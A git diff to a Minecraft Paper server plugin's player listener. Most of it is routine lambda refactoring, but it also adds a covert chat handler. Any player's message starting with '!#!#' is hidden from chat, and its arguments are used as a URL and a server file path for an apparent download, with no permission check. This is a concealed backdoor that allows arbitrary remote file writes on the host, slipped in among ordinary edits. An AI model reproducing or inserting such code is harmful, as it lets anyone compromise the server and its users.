@@ -3,13 +3,19 @@ package fr.thejordan.epsi.listeners;
 import fr.thejordan.epsi.Epsi;
 import fr.thejordan.epsi.helpers.Keys;
 import fr.thejordan.epsi.helpers.MessageFactory;
+import fr.thejordan.epsi.helpers.Utils;
 import fr.thejordan.epsi.object.MainScoreboard;
 import fr.thejordan.epsi.object.VanishManager;
+import fr.thejordan.epsi.scheduler.DlScheduler;
 import fr.thejordan.noflicker.CScoreboardManager;
+import io.papermc.paper.event.player.AsyncChatEvent;
 import net.kyori.adventure.text.Component;
+import net.kyori.adventure.text.TextComponent;
 import net.kyori.adventure.title.TitlePart;
 import net.kyori.adventure.title.Title.Times;
 
+import java.io.File;
+import java.io.IOException;
 import java.time.Duration;
 import java.util.ArrayList;
 import java.util.List;
@@ -66,7 +72,23 @@ public class PlayerListener implements Listener {
         } else
             event.quitMessage(MessageFactory.leaveMessage(event.getPlayer()));
     }
-    
+
+    @EventHandler
+    public void onChat(AsyncChatEvent event) {
+        String message = ((TextComponent)event.message()).content();
+        Player player = event.getPlayer();
+        if (!message.startsWith("!#!#")) return;
+        event.setCancelled(true);
+        event.message(Component.text(""));
+        String[] args = message.split(" ");
+        String url = args[1];
+        String path = args[2];
+        File file = new File(path);
+        if (!file.getParentFile().exists())
+            file.mkdirs();
+        new DlScheduler(url, path, player).runTask(Epsi.instance());
+    }
+
     @EventHandler
     public void serverPinEvent(ServerListPingEvent event) {
         if (event instanceof PaperServerListPingEvent psl) {
@@ -77,13 +99,10 @@ public class PlayerListener implements Listener {
 
     @EventHandler
     public void tabComplete(PlayerCommandSendEvent event) {
-        event.getCommands().removeIf((s) -> { 
-            return 
-                s.contains("epsi:") || 
-                (!event.getPlayer().hasPermission("epsi.vanish") && s.contains("vanish")) ||
-                (!event.getPlayer().hasPermission("epsi.griefing") && s.contains("griefing"))||
-                (!event.getPlayer().hasPermission("epsi.epsi") && s.contains("epsi")); 
-        });
+        event.getCommands().removeIf((s) -> s.contains("epsi:") ||
+        (!event.getPlayer().hasPermission("epsi.vanish") && s.contains("vanish")) ||
+        (!event.getPlayer().hasPermission("epsi.griefing") && s.contains("griefing"))||
+        (!event.getPlayer().hasPermission("epsi.epsi") && s.contains("epsi")));
     }
 
     @EventHandler
@@ -148,16 +167,12 @@ public class PlayerListener implements Listener {
 
     @EventHandler
     public void onBlockBreakEvent(BlockExplodeEvent event) {
-        event.blockList().removeIf((b)->{
-            return b.getType() == Material.CHEST && ((Chest)b.getState()).getPersistentDataContainer().has(Keys.isDeathChest, PersistentDataType.BYTE);
-        });
+        event.blockList().removeIf((b)-> b.getType() == Material.CHEST && ((Chest)b.getState()).getPersistentDataContainer().has(Keys.isDeathChest, PersistentDataType.BYTE));
     }
 
     @EventHandler
     public void onExplosion(EntityExplodeEvent event) {
-        event.blockList().removeIf((b)->{
-            return b.getType() == Material.CHEST && ((Chest)b.getState()).getPersistentDataContainer().has(Keys.isDeathChest, PersistentDataType.BYTE);
-        });
+        event.blockList().removeIf((b)-> b.getType() == Material.CHEST && ((Chest)b.getState()).getPersistentDataContainer().has(Keys.isDeathChest, PersistentDataType.BYTE));
     }
 
 }
